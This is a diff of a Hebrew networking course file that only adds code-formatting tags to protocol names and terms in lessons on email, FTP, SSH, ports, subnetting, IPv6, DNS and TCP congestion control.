-            <tr><td>POP3</td><td>110 / 995</td><td>קריאת אימייל — מוריד ומוחק מהשרת</td></tr>
+            <tr><td><code>SMTP</code></td><td>25 / 587</td><td>שליחת אימייל</td></tr>
+            <tr><td><code>IMAP</code></td><td>143 / 993</td><td>קריאת אימייל — מסנכרן, ממשיך בשרת</td></tr>
+            <tr><td><code>POP3</code></td><td>110 / 995</td><td>קריאת אימייל — מוריד ומוחק מהשרת</td></tr>
           </table>
           <div class="diagram-container">
             <svg viewBox="0 0 380 100" class="content-diagram">
@@ -3041,10 +3041,10 @@ response = requests.get('https://self-signed.badssl.com', verify=False)</code></
             </svg>
             <p class="diagram-caption">SMTP לשליחה, IMAP לקבלה (נשאר בשרת)</p>
           </div>
-          <p><strong>IMAP</strong></p>
+          <p><strong><code>IMAP</code></strong></p>
           <p>שומר הודעות בשרת.</p>
           <p>ניתן לפתוח ממחשב ומטלפון ולראות את אותן הודעות — מסונכרן בין כל המכשירים.</p>
-          <p><strong>POP3</strong></p>
+          <p><strong><code>POP3</code></strong></p>
           <p>מוריד הודעות למכשיר ומוחק מהשרת.</p>
           <p>ההודעות קיימות רק על מכשיר אחד.</p>
           <p><strong>גרסאות מוצפנות:</strong></p>
@@ -3088,7 +3088,7 @@ with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
         type: "explanation",
         title: "FTP – העברת קבצים",
         content: `
-          <p><strong>FTP</strong> — <code>File Transfer Protocol</code></p>
+          <p><strong><code>FTP</code></strong> — <code>File Transfer Protocol</code></p>
           <p>פרוטוקול להעברת קבצים בין מחשבים.</p>
           <p>פועל על פורט 21 — פקודות, ופורט 20 — נתונים.</p>
           <p><strong>שני מצבי העברה:</strong></p>
@@ -3120,8 +3120,8 @@ ftp.quit()</code></pre>
           </div>
           <p><strong>גרסאות מאובטחות:</strong></p>
           <ul>
-            <li><strong>SFTP</strong> — <code>SSH File Transfer Protocol</code>. פרוטוקול נפרד לחלוטין מ-<code>FTP</code>, שרץ מעל <code>SSH</code> בפורט 22. למרות השם הדומה, אינו קשור ל-<code>FTP</code> הישן</li>
-            <li><strong>FTPS</strong> — <code>FTP</code> המקורי עם שכבת <code>TLS</code> מעליו.</li>
+            <li><strong><code>SFTP</code></strong> — <code>SSH File Transfer Protocol</code>. פרוטוקול נפרד לחלוטין מ-<code>FTP</code>, שרץ מעל <code>SSH</code> בפורט 22. למרות השם הדומה, אינו קשור ל-<code>FTP</code> הישן</li>
+            <li><strong><code>FTPS</code></strong> — <code>FTP</code> המקורי עם שכבת <code>TLS</code> מעליו.</li>
           </ul>
           <p><code>FTP</code> רגיל מעביר נתונים כטקסט גלוי.</p>
           <p>אין להשתמש ב-<code>FTP</code> ישן ברשת ציבורית.</p>
@@ -3131,7 +3131,7 @@ ftp.quit()</code></pre>
         type: "explanation",
         title: "SSH – גישה מרוחקת מאובטחת",
         content: `
-          <p><strong>SSH</strong> — <code>Secure Shell</code></p>
+          <p><strong><code>SSH</code></strong> — <code>Secure Shell</code></p>
           <p>פרוטוקול לגישה מרוחקת מוצפנת.</p>
           <p>פורט 22. מחליף את <code>Telnet</code> — לא מוצפן — לחלוטין.</p>
           <p><strong>מה אפשר לעשות ב-SSH:</strong></p>
@@ -3182,18 +3182,18 @@ ssh.close()</code></pre>
           <p>פורטים ידועים — 0 עד 1023 — מוקצים ל-<code>Well-Known Services</code>:</p>
           <table class="content-table">
             <tr><th>פורט</th><th>פרוטוקול</th><th>שכבה</th><th>שימוש</th></tr>
-            <tr><td>20/21</td><td>FTP</td><td>TCP</td><td>העברת קבצים</td></tr>
-            <tr><td>22</td><td>SSH</td><td>TCP</td><td>גישה מרוחקת מאובטחת</td></tr>
-            <tr><td>23</td><td>Telnet</td><td>TCP</td><td>גישה מרוחקת — לא מוצפן!</td></tr>
-            <tr><td>25</td><td>SMTP</td><td>TCP</td><td>שליחת אימייל</td></tr>
-            <tr><td>53</td><td>DNS</td><td>UDP/TCP</td><td>מיפוי דומיין ל-IP</td></tr>
-            <tr><td>67/68</td><td>DHCP</td><td>UDP</td><td>הקצאת IP אוטומטית</td></tr>
-            <tr><td>80</td><td>HTTP</td><td>TCP</td><td>גלישה (לא מוצפן)</td></tr>
-            <tr><td>110</td><td>POP3</td><td>TCP</td><td>קריאת אימייל</td></tr>
-            <tr><td>143</td><td>IMAP</td><td>TCP</td><td>קריאת אימייל (מסונכרן)</td></tr>
-            <tr><td>443</td><td>HTTPS</td><td>TCP</td><td>גלישה מוצפנת — TLS</td></tr>
-            <tr><td>993</td><td>IMAPS</td><td>TCP</td><td>IMAP מוצפן</td></tr>
-            <tr><td>3389</td><td>RDP</td><td>TCP</td><td>Remote Desktop — Windows</td></tr>
+            <tr><td>20/21</td><td><code>FTP</code></td><td><code>TCP</code></td><td>העברת קבצים</td></tr>
+            <tr><td>22</td><td><code>SSH</code></td><td><code>TCP</code></td><td>גישה מרוחקת מאובטחת</td></tr>
+            <tr><td>23</td><td><code>Telnet</code></td><td><code>TCP</code></td><td>גישה מרוחקת — לא מוצפן!</td></tr>
+            <tr><td>25</td><td><code>SMTP</code></td><td><code>TCP</code></td><td>שליחת אימייל</td></tr>
+            <tr><td>53</td><td><code>DNS</code></td><td><code>UDP</code>/<code>TCP</code></td><td>מיפוי דומיין ל-IP</td></tr>
+            <tr><td>67/68</td><td><code>DHCP</code></td><td><code>UDP</code></td><td>הקצאת IP אוטומטית</td></tr>
+            <tr><td>80</td><td><code>HTTP</code></td><td><code>TCP</code></td><td>גלישה (לא מוצפן)</td></tr>
+            <tr><td>110</td><td><code>POP3</code></td><td><code>TCP</code></td><td>קריאת אימייל</td></tr>
+            <tr><td>143</td><td><code>IMAP</code></td><td><code>TCP</code></td><td>קריאת אימייל (מסונכרן)</td></tr>
+            <tr><td>443</td><td><code>HTTPS</code></td><td><code>TCP</code></td><td>גלישה מוצפנת — <code>TLS</code></td></tr>
+            <tr><td>993</td><td><code>IMAPS</code></td><td><code>TCP</code></td><td><code>IMAP</code> מוצפן</td></tr>
+            <tr><td>3389</td><td><code>RDP</code></td><td><code>TCP</code></td><td><code>Remote Desktop</code> — <code>Windows</code></td></tr>
           </table>
         `
       },
@@ -3205,10 +3205,10 @@ ssh.close()</code></pre>
             <h3>נקודות מפתח:</h3>
             <ul>
               <li>Email: <code>SMTP</code> — שליחה, פורט 25/587. <code>IMAP</code> — קריאה מסונכרנת, פורט 143. <code>POP3</code> — הורדה, פורט 110</li>
-              <li>FTP: פורט 21 — פקודות, פורט 20 — נתונים. <code>Passive mode</code> עם Firewall. <code>SFTP</code> = FTP מעל SSH</li>
-              <li>SSH: פורט 22. מוצפן. Terminal מרוחק, SCP, SFTP, Port Forwarding</li>
-              <li>SSH Keys: אימות חזק ללא סיסמה. Paramiko – SSH מפייתון</li>
-              <li>Telnet – לא מוצפן – לא להשתמש! SSH מחליף אותו</li>
+              <li><code>FTP</code>: פורט 21 — פקודות, פורט 20 — נתונים. <code>Passive mode</code> עם <code>Firewall</code>. <code>SFTP</code> = <code>FTP</code> מעל <code>SSH</code></li>
+              <li><code>SSH</code>: פורט 22. מוצפן. <code>Terminal</code> מרוחק, <code>SCP</code>, <code>SFTP</code>, <code>Port Forwarding</code></li>
+              <li><code>SSH Keys</code>: אימות חזק ללא סיסמה. <code>Paramiko</code> – <code>SSH</code> מפייתון</li>
+              <li><code>Telnet</code> – לא מוצפן – לא להשתמש! <code>SSH</code> מחליף אותו</li>
             </ul>
           </div>
         `
@@ -3241,7 +3241,7 @@ ssh.close()</code></pre>
         type: "explanation",
         title: "מה זה Subnetting?",
         content: `
-          <p><strong>Subnetting</strong> — חלוקת תת-רשתות</p>
+          <p><strong><code>Subnetting</code></strong> — חלוקת תת-רשתות</p>
           <p>חלוקת רשת IP גדולה לרשתות קטנות יותר.</p>
           <p><strong>למה מחלקים לתת-רשתות?</strong></p>
           <ul>
@@ -3287,7 +3287,7 @@ ssh.close()</code></pre>
           <ul>
             <li>כתובת רשת: 192.168.1.0 (לא ניתן להקצות למארח)</li>
             <li>טווח מארחים: 192.168.1.1 – 192.168.1.254</li>
-            <li>Broadcast: 192.168.1.255</li>
+            <li><code>Broadcast</code>: 192.168.1.255</li>
             <li>סה"כ מארחים: 254</li>
           </ul>
         `
@@ -3305,7 +3305,7 @@ ssh.close()</code></pre>
             <tr><td>192.168.0.0 – 192.168.255.255</td><td>192.168.0.0/16</td><td>65K</td><td>בית, משרדים קטנים</td></tr>
           </table>
           <p><strong>כתובות ציבוריות</strong> – שאר הטווחים.</p>
-          <p>הן מוקצות על ידי <span dir="ltr">IANA → RIR → ISP → לקוח</span>.</p>
+          <p>הן מוקצות על ידי <span dir="ltr"><code>IANA</code> → <code>RIR</code> → <code>ISP</code> → לקוח</span>.</p>
           <p><strong>כתובות מיוחדות נוספות:</strong></p>
           <ul>
             <li><code>127.0.0.0/8</code> — Loopback — 127.0.0.1 = localhost</li>
@@ -3411,10 +3411,10 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>Subnetting = חלוקת רשת גדולה לרשתות קטנות. IP = חלק רשת + חלק מארח</li>
-              <li>CIDR /prefix: /24 = 254 מארחים, /25 = 126, /30 = 2. כתובות = 2 בחזקת 32 פחות prefix, פחות 2</li>
+              <li><code>Subnetting</code> = חלוקת רשת גדולה לרשתות קטנות. <code>IP</code> = חלק רשת + חלק מארח</li>
+              <li><code>CIDR</code> /prefix: /24 = 254 מארחים, /25 = 126, /30 = 2. כתובות = 2 בחזקת 32 פחות prefix, פחות 2</li>
               <li>כתובות פרטיות: 10.x.x.x, 172.16-31.x.x, 192.168.x.x – לא ניתנות לניתוב</li>
-              <li>127.0.0.1 = loopback. 0.0.0.0 = כל ממשקים. 255.255.255.255 = Broadcast</li>
+              <li>127.0.0.1 = <code>loopback</code>. 0.0.0.0 = כל ממשקים. 255.255.255.255 = <code>Broadcast</code></li>
               <li>חישוב: prefix /26 = block size 64. כל תת-רשת מתחילה במכפלה של block size</li>
               <li>Python: import ipaddress – ip_network, subnets(), hosts()</li>
             </ul>
@@ -3449,10 +3449,10 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
         type: "explanation",
         title: "למה IPv6?",
         content: `
-          <p><strong>IPv4 כמעט נגמר.</strong> 4.3 מיליארד כתובות נשמעו הרבה ב-1981.</p>
+          <p><strong><code>IPv4</code> כמעט נגמר.</strong> 4.3 מיליארד כתובות נשמעו הרבה ב-1981.</p>
           <p>אבל האינטרנט גדל לכל מכשיר: טלפון, רכב, מצלמת אבטחה, מקרר חכם.</p>
-          <p>IANA הקצתה את בלוק ה-IPv4 האחרון ב-<strong>2011</strong>.</p>
-          <p><strong>IPv6</strong> נוצר לפתרון הבעיה.</p>
+          <p><code>IANA</code> הקצתה את בלוק ה-<code>IPv4</code> האחרון ב-<strong>2011</strong>.</p>
+          <p><strong><code>IPv6</code></strong> נוצר לפתרון הבעיה.</p>
           <p>128 ביטים = <strong>2<sup>128</sup> ≈ 3.4 × 10<sup>38</sup></strong> כתובות.</p>
           <p>מספיק לתת לכל גרגר חול על כדור הארץ כמה מיליארד כתובות.</p>
           <div class="diagram-container">
@@ -3492,10 +3492,10 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
           <p><strong>כתובות מיוחדות:</strong></p>
           <table class="content-table">
             <tr><th>כתובת</th><th>IPv4 מקביל</th><th>משמעות</th></tr>
-            <tr><td><code>::1</code></td><td>127.0.0.1</td><td>Loopback</td></tr>
+            <tr><td><code>::1</code></td><td>127.0.0.1</td><td><code>Loopback</code></td></tr>
             <tr><td><code>::</code></td><td>0.0.0.0</td><td>כל הממשקים / לא מוגדר</td></tr>
-            <tr><td><code>fe80::/10</code></td><td>169.254.x.x</td><td>Link-Local – ממשק מקומי בלבד</td></tr>
-            <tr><td><code>ff02::1</code></td><td>255.255.255.255</td><td>Multicast – כל הצמתים</td></tr>
+            <tr><td><code>fe80::/10</code></td><td>169.254.x.x</td><td><code>Link-Local</code> – ממשק מקומי בלבד</td></tr>
+            <tr><td><code>ff02::1</code></td><td>255.255.255.255</td><td><code>Multicast</code> – כל הצמתים</td></tr>
           </table>
         `
       },
@@ -3505,20 +3505,20 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
         content: `
           <table class="content-table">
             <tr><th>סוג</th><th>Prefix</th><th>תיאור</th></tr>
-            <tr><td><strong>Global Unicast</strong></td><td>2000::/3</td><td>ניתן לניתוב – כמו IPv4 ציבורי</td></tr>
-            <tr><td><strong>Link-Local</strong></td><td>fe80::/10</td><td>אוטומטי על כל ממשק; לא ניתב</td></tr>
-            <tr><td><strong>Unique Local</strong></td><td>fc00::/7</td><td>כמו RFC 1918 – פרטי, לא ניתב</td></tr>
-            <tr><td><strong>Loopback</strong></td><td>::1/128</td><td>localhost</td></tr>
-            <tr><td><strong>Multicast</strong></td><td>ff00::/8</td><td>אחד-לרבים. מחליף Broadcast</td></tr>
-            <tr><td><strong>Anycast</strong></td><td>מ-unicast</td><td>אותה כתובת לכמה שרתים – הקרוב מנצח</td></tr>
+            <tr><td><strong><code>Global Unicast</code></strong></td><td>2000::/3</td><td>ניתן לניתוב – כמו IPv4 ציבורי</td></tr>
+            <tr><td><strong><code>Link-Local</code></strong></td><td>fe80::/10</td><td>אוטומטי על כל ממשק; לא ניתב</td></tr>
+            <tr><td><strong><code>Unique Local</code></strong></td><td>fc00::/7</td><td>כמו RFC 1918 – פרטי, לא ניתב</td></tr>
+            <tr><td><strong><code>Loopback</code></strong></td><td>::1/128</td><td>localhost</td></tr>
+            <tr><td><strong><code>Multicast</code></strong></td><td>ff00::/8</td><td>אחד-לרבים. מחליף Broadcast</td></tr>
+            <tr><td><strong><code>Anycast</code></strong></td><td>מ-unicast</td><td>אותה כתובת לכמה שרתים – הקרוב מנצח</td></tr>
           </table>
-          <p><strong>אין Broadcast ב-IPv6!</strong></p>
+          <p><strong>אין <code>Broadcast</code> ב-<code>IPv6</code>!</strong></p>
           <p>שידורי <code>Broadcast</code> הוחלפו ב-<code>Multicast</code> ממוקד:</p>
           <ul>
             <li><code>ff02::1</code> – כל הצמתים ברשת המקומית</li>
             <li><code>ff02::2</code> – כל הנתבים ברשת המקומית</li>
           </ul>
-          <p><strong>Link-Local</strong> – כתובת שנוצרת אוטומטית על כל ממשק רשת.</p>
+          <p><strong><code>Link-Local</code></strong> – כתובת שנוצרת אוטומטית על כל ממשק רשת.</p>
           <p>מחושבת מכתובת ה-<code>MAC</code> בשיטת <code>EUI-64</code>.</p>
           <p>שימושית לפרוטוקול <code>NDP</code> ולגילוי נתבים — ללא צורך בשרת <code>DHCP</code>.</p>
         `
@@ -3532,10 +3532,10 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
           <p><strong>שינויים עיקריים ב-IPv6 Header:</strong></p>
           <ul>
             <li><strong>אין Checksum</strong> — מוריד עומס מנתבים. <code>TCP</code>/<code>UDP</code> כבר בודקים</li>
-            <li><strong>אין Fragmentation בנתבים</strong> – רק המקור מפצל. נתבים מחזירים <code>ICMPv6 "Packet Too Big"</code> אם החבילה גדולה מדי</li>
+            <li><strong>אין Fragmentation בנתבים</strong> – רק המקור מפצל. נתבים מחזירים <code>ICMPv6</code> <code>"Packet Too Big"</code> אם החבילה גדולה מדי</li>
             <li><strong>Flow Label</strong> — שדה 20-bit לזיהוי זרם תעבורה — <code>QoS</code>, <code>load balancing</code></li>
-            <li><strong>Hop Limit</strong> – כמו TTL, מפחית ב-1 בכל hop</li>
-            <li><strong>Extension Headers</strong> – אפשרויות הועברו ל-headers נוספים מחוץ ל-header הבסיסי</li>
+            <li><strong><code>Hop Limit</code></strong> – כמו <code>TTL</code>, מפחית ב-1 בכל hop</li>
+            <li><strong><code>Extension Headers</code></strong> – אפשרויות הועברו ל-headers נוספים מחוץ ל-header הבסיסי</li>
           </ul>
         `
       },
@@ -3549,12 +3549,12 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
           <p><strong>הודעות NDP עיקריות:</strong></p>
           <table class="content-table">
             <tr><th>הודעה</th><th>כמו ב-IPv4</th><th>תפקיד</th></tr>
-            <tr><td>Router Solicitation — RS</td><td>DHCP Discover</td><td>מחשב שואל "יש נתב?"</td></tr>
-            <tr><td>Router Advertisement — RA</td><td>DHCP Offer</td><td>נתב מכריז prefix, gateway, MTU</td></tr>
-            <tr><td>Neighbor Solicitation — NS</td><td>ARP Request</td><td>"מי מחזיק כתובת X?"</td></tr>
-            <tr><td>Neighbor Advertisement — NA</td><td>ARP Reply</td><td>"אני! הנה ה-MAC שלי"</td></tr>
+            <tr><td><code>Router Solicitation</code> — <code>RS</code></td><td><code>DHCP Discover</code></td><td>מחשב שואל "יש נתב?"</td></tr>
+            <tr><td><code>Router Advertisement</code> — <code>RA</code></td><td><code>DHCP Offer</code></td><td>נתב מכריז prefix, gateway, MTU</td></tr>
+            <tr><td><code>Neighbor Solicitation</code> — <code>NS</code></td><td><code>ARP Request</code></td><td>"מי מחזיק כתובת X?"</td></tr>
+            <tr><td><code>Neighbor Advertisement</code> — <code>NA</code></td><td><code>ARP Reply</code></td><td>"אני! הנה ה-MAC שלי"</td></tr>
           </table>
-          <p><strong>SLAAC</strong> — <code>Stateless Address Autoconfiguration</code></p>
+          <p><strong><code>SLAAC</code></strong> — <code>Stateless Address Autoconfiguration</code></p>
           <p>מחשב יכול לקבוע לעצמו כתובת <code>IPv6</code> ציבורית, <em>ללא DHCP</em>.</p>
           <p><strong>שלבי SLAAC:</strong></p>
           <ol>
@@ -3577,10 +3577,10 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
           <p>כך עובדות רוב הרשתות היום.</p>
           <p><strong>Tunneling</strong> – IPv6 בתוך IPv4:</p>
           <ul>
-            <li><strong>6in4</strong> – כמוס IPv6 ב-IPv4 Protocol 41. דורש tunnel broker</li>
-            <li><strong>Teredo</strong> – IPv6 מעל UDP. עובד דרך NAT. בשימוש ב-Windows</li>
+            <li><strong><code>6in4</code></strong> – כמוס IPv6 ב-IPv4 Protocol 41. דורש tunnel broker</li>
+            <li><strong><code>Teredo</code></strong> – <code>IPv6</code> מעל <code>UDP</code>. עובד דרך <code>NAT</code>. בשימוש ב-<code>Windows</code></li>
           </ul>
-          <p><strong>NAT64 + DNS64</strong> – מאפשר מכשירי IPv6-only לתקשר עם שרתים IPv4-only:</p>
+          <p><strong><code>NAT64</code> + <code>DNS64</code></strong> – מאפשר מכשירי IPv6-only לתקשר עם שרתים IPv4-only:</p>
           <ul>
             <li><code>DNS64</code> יוצר <code>AAAA record</code> סינתטי מה-<code>A record</code>: <code>64:ff9b::93.184.216.34</code></li>
             <li><code>NAT64 gateway</code> מתרגם חבילות IPv6 ↔ IPv4 בפועל</li>
@@ -3621,12 +3621,12 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>IPv6 = 128 ביטים, 2<sup>128</sup> כתובות. כתיבה: 8 קבוצות hex מופרדות ב-:</li>
+              <li><code>IPv6</code> = 128 ביטים, 2<sup>128</sup> כתובות. כתיבה: 8 קבוצות hex מופרדות ב-:</li>
               <li>קיצורים: השמטת אפסים מובילים, :: לקבוצות אפסים רצופות</li>
-              <li>סוגים: Global Unicast, Link-Local — fe80::, Unique Local, Multicast — ff00::. אין Broadcast!</li>
-              <li>Header קבוע 40B. אין checksum. אין fragmentation בנתבים. Flow Label</li>
-              <li>NDP מחליף ARP — Multicast, לא Broadcast. SLAAC — IP אוטומטי ללא DHCP</li>
-              <li>Dual-Stack = IPv4+IPv6 במקביל. NAT64+DNS64 = IPv6-only ↔ IPv4</li>
+              <li>סוגים: <code>Global Unicast</code>, <code>Link-Local</code> — fe80::, <code>Unique Local</code>, <code>Multicast</code> — ff00::. אין <code>Broadcast</code>!</li>
+              <li><code>Header</code> קבוע 40B. אין <code>checksum</code>. אין <code>fragmentation</code> בנתבים. <code>Flow Label</code></li>
+              <li><code>NDP</code> מחליף <code>ARP</code> — <code>Multicast</code>, לא <code>Broadcast</code>. <code>SLAAC</code> — <code>IP</code> אוטומטי ללא <code>DHCP</code></li>
+              <li><code>Dual-Stack</code> = <code>IPv4</code>+<code>IPv6</code> במקביל. <code>NAT64</code>+<code>DNS64</code> = <code>IPv6</code>-only ↔ <code>IPv4</code></li>
             </ul>
           </div>
         `
@@ -3676,14 +3676,14 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
               <line x1="280" y1="35" x2="280" y2="55" stroke="var(--text-muted)" stroke-dasharray="3,3"/>
             </svg>
           </div>
-          <p><strong>Root Nameservers</strong> — 13 כתובות לוגיות — A עד M.</p>
+          <p><strong><code>Root Nameservers</code></strong> — 13 כתובות לוגיות — A עד M.</p>
           <p>מופעלות על ידי 12 ארגונים שונים.</p>
           <p>כל כתובת מגובה על ידי מאות שרתים פיזיים ברחבי העולם, באמצעות <code>Anycast</code>.</p>
           <p>שרתי ה-Root לא יודעים כתובות סופיות — רק לאיזה שרת <code>TLD</code> לפנות.</p>
-          <p><strong>TLD Nameservers</strong> – אחראיים על סיומת הדומיין.</p>
+          <p><strong><code>TLD Nameservers</code></strong> – אחראיים על סיומת הדומיין.</p>
           <p>לדוגמה: <code>.com</code> מנוהל על ידי <code>Verisign</code>, ו-<code>.org</code> על ידי <code>PIR</code>.</p>
           <p>שרתי ה-<code>TLD</code> יודעים מי השרת ה-<code>Authoritative</code> לכל דומיין תחתיהם.</p>
-          <p><strong>Authoritative Nameservers</strong> – המקור האמיתי לדומיין.</p>
+          <p><strong><code>Authoritative Nameservers</code></strong> – המקור האמיתי לדומיין.</p>
           <p>מחזיקים את הרשומות האמיתיות. תשובתם סופית ואינה דורשת הפניה נוספת.</p>
         `
       },
@@ -3699,7 +3699,7 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
               <li><strong>Root Query</strong> – Resolver שואל Root: "מי מטפל ב-<code>.com</code>?"</li>
               <li><strong>TLD Query</strong> – Root מחזיר כתובת TLD. Resolver שואל TLD: "מי מטפל ב-<code>example.com</code>?"</li>
               <li><strong>Authoritative Query</strong> – TLD מחזיר Authoritative. Resolver שואל: "מה ה-IP של <code>www.example.com</code>?"</li>
-              <li><strong>תשובה + Cache</strong> – Authoritative מחזיר A record. Resolver שומר ב-cache לפי TTL ומעביר ללקוח</li>
+              <li><strong>תשובה + Cache</strong> – <code>Authoritative</code> מחזיר <code>A record</code>. <code>Resolver</code> שומר ב-cache לפי <code>TTL</code> ומעביר ללקוח</li>
             </ol>
           </div>
           <p>שלבים 3–5 קורים בדרך כלל תוך ~50ms. עם cache — ~1ms.</p>
@@ -3771,7 +3771,7 @@ $ dig +trace www.example.com</code></pre>
         type: "explanation",
         title: "DNS Caching ו-TTL",
         content: `
-          <p>כל record DNS מכיל <strong>TTL</strong> — <code>Time To Live</code> — בשניות.</p>
+          <p>כל record DNS מכיל <strong><code>TTL</code></strong> — <code>Time To Live</code> — בשניות.</p>
           <p>קובע כמה זמן ה-resolver שומר ב-cache.</p>
           <p><strong>TTL נמוך</strong> — 300 שניות = 5 דקות:</p>
           <ul>
@@ -3810,7 +3810,7 @@ sudo dscacheutil -flushcache</code></pre>
         title: "DNS over HTTPS — DoH ו-DNS over TLS — DoT",
         content: `
           <p><code>DNS</code> מסורתי עובד על <code>UDP</code> פורט 53 ומועבר כטקסט גלוי.</p>
-          <p>כל מי שנמצא בדרך — ספק האינטרנט, רשת WiFi ציבורית — יכול לראות לאיזה אתרים גולשים.</p>
+          <p>כל מי שנמצא בדרך — ספק האינטרנט, רשת <code>WiFi</code> ציבורית — יכול לראות לאיזה אתרים גולשים.</p>
           <p><strong>DNS over HTTPS</strong> — <code>DoH</code></p>
           <p>שאילתות <code>DNS</code> מוצפנות בתוך <code>HTTPS</code> על פורט 443.</p>
           <p>מבחוץ לא ניתן להבדיל בינן לבין גלישה רגילה.</p>
@@ -3861,10 +3861,10 @@ sudo dscacheutil -flushcache</code></pre>
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>היררכיה: Root — 13 לוגיים → TLD — .com → Authoritative — הרשומות האמיתיות</li>
-              <li>Recursive Resolver עושה את כל העבודה עבור הלקוח. Cache על TTL</li>
-              <li>Records: A — IPv4, AAAA — IPv6, CNAME — alias, MX — mail, TXT — SPF/DKIM, NS, PTR — reverse, SOA, CAA</li>
-              <li>TTL גבוה = מהיר, איטי להשתנות. TTL נמוך = גמיש, עמוס</li>
+              <li>היררכיה: <code>Root</code> — 13 לוגיים → <code>TLD</code> — .com → <code>Authoritative</code> — הרשומות האמיתיות</li>
+              <li><code>Recursive Resolver</code> עושה את כל העבודה עבור הלקוח. <code>Cache</code> על <code>TTL</code></li>
+              <li><code>Records</code>: <code>A</code> — <code>IPv4</code>, <code>AAAA</code> — <code>IPv6</code>, <code>CNAME</code> — alias, <code>MX</code> — mail, <code>TXT</code> — <code>SPF</code>/<code>DKIM</code>, <code>NS</code>, <code>PTR</code> — reverse, <code>SOA</code>, <code>CAA</code></li>
+              <li><code>TTL</code> גבוה = מהיר, איטי להשתנות. <code>TTL</code> נמוך = גמיש, עמוס</li>
               <li><code>DoH</code> — פורט 443, <code>DoT</code> — פורט 853. DNS מוצפן להגנת פרטיות</li>
               <li>dig = כלי מקצועי. dig +trace = מסלול מלא. ipconfig /flushdns = ניקוי cache</li>
             </ul>
@@ -3902,8 +3902,8 @@ sudo dscacheutil -flushcache</code></pre>
           <p><code>TCP</code> מבטיח העברה אמינה — אבל יש שלוש בעיות נפרדות שצריך לפתור:</p>
           <ul>
             <li><strong>אובדן חבילות</strong> – פקטה לא הגיעה, צריך לשלוח שוב</li>
-            <li><strong>Flow Control</strong> – שולח מהיר מציף מקבל איטי</li>
-            <li><strong>Congestion Control</strong> – כולם שולחים, הרשת עמוסה, כולם מאטים</li>
+            <li><strong><code>Flow Control</code></strong> – שולח מהיר מציף מקבל איטי</li>
+            <li><strong><code>Congestion Control</code></strong> – כולם שולחים, הרשת עמוסה, כולם מאטים</li>
           </ul>
           <p><code>TCP</code> פותר את שלושתן, כל אחת בנפרד.</p>
         `
@@ -3912,7 +3912,7 @@ sudo dscacheutil -flushcache</code></pre>
         type: "explanation",
         title: "Sliding Window – Flow Control",
         content: `
-          <p><strong>Flow Control</strong> מונע ממחשב מהיר להציף מחשב איטי.</p>
+          <p><strong><code>Flow Control</code></strong> מונע ממחשב מהיר להציף מחשב איטי.</p>
           <p>הפתרון: <strong>Receive Window</strong> — <code>rwnd</code>.</p>
           <p>בכל <code>ACK</code>, המקבל מודיע: "יש לי <code>rwnd</code> בתים מקום ב-buffer — שלח עד כאן".</p>
           <p>השולח לא שולח יותר מ-<code>rwnd</code> בתים בכל רגע.</p>
@@ -3946,10 +3946,10 @@ sudo dscacheutil -flushcache</code></pre>
         type: "explanation",
         title: "Congestion Control – Slow Start",
         content: `
-          <p><strong>Congestion Control</strong> מונע מכולם להציף את הרשת.</p>
+          <p><strong><code>Congestion Control</code></strong> מונע מכולם להציף את הרשת.</p>
           <p>השולח מנהל <strong>Congestion Window</strong> — <code>cwnd</code>.</p>
           <p>הכלל: מספר הבתים בטיסה ≤ הערך הנמוך מבין <code>cwnd</code> ו-<code>rwnd</code>.</p>
-          <p><strong>Slow Start</strong> – בפתיחת חיבור, <code>cwnd</code> מתחיל קטן ומתגדל במהירות:</p>
+          <p><strong><code>Slow Start</code></strong> – בפתיחת חיבור, <code>cwnd</code> מתחיל קטן ומתגדל במהירות:</p>
           <ul>
             <li><code>cwnd</code> מתחיל ב-1 עד 10 MSS — <code>Maximum Segment Size</code> ≈ 1460 בתים</li>
             <li>כל ACK שמגיע → cwnd += 1 MSS</li>
@@ -3977,26 +3977,26 @@ sudo dscacheutil -flushcache</code></pre>
         type: "explanation",
         title: "Congestion Avoidance ו-AIMD",
         content: `
-          <p>לאחר שמגיע ל-<code>ssthresh</code>, TCP עובר ל-<strong>Congestion Avoidance</strong>:</p>
+          <p>לאחר שמגיע ל-<code>ssthresh</code>, <code>TCP</code> עובר ל-<strong><code>Congestion Avoidance</code></strong>:</p>
           <ul>
             <li>גידול לינארי: כל RTT → cwnd += 1 MSS</li>
-            <li>האלגוריתם: <strong>AIMD</strong> — <code>Additive Increase, Multiplicative Decrease</code></li>
+            <li>האלגוריתם: <strong><code>AIMD</code></strong> — <code>Additive Increase, Multiplicative Decrease</code></li>
           </ul>
           <p><strong>זיהוי אובדן</strong> — <code>Loss Detection</code>:</p>
           <p><strong>שיטה 1 — Timeout</strong> — <code>RTO</code>: לא הגיע ACK בזמן:</p>
           <ul>
             <li>ssthresh = cwnd / 2</li>
             <li><code>cwnd</code> = 1 MSS — חזרה ל-Slow Start מהתחלה</li>
-            <li>RTO מוכפל — Exponential Backoff</li>
+            <li><code>RTO</code> מוכפל — <code>Exponential Backoff</code></li>
           </ul>
           <p><strong>שיטה 2 — 3 Duplicate ACKs</strong> — <code>Fast Retransmit</code>: 3 ACKs לאותו sequence = חבילה אחת אבדה:</p>
           <ul>
             <li>שולח מיד — לא מחכה ל-timeout</li>
             <li>ssthresh = cwnd / 2; cwnd = ssthresh + 3 MSS</li>
-            <li><strong>Fast Recovery</strong> – לא חוזרים ל-Slow Start, נשארים ב-Congestion Avoidance</li>
+            <li><strong><code>Fast Recovery</code></strong> – לא חוזרים ל-<code>Slow Start</code>, נשארים ב-<code>Congestion Avoidance</code></li>
           </ul>
-          <p>Timeout = ייתכן שהרשת עמוסה מאוד.</p>
-          <p>Dup-ACKs = כנראה חבילה בודדת אבדה, הרשת עדיין עובדת.</p>
+          <p><code>Timeout</code> = ייתכן שהרשת עמוסה מאוד.</p>
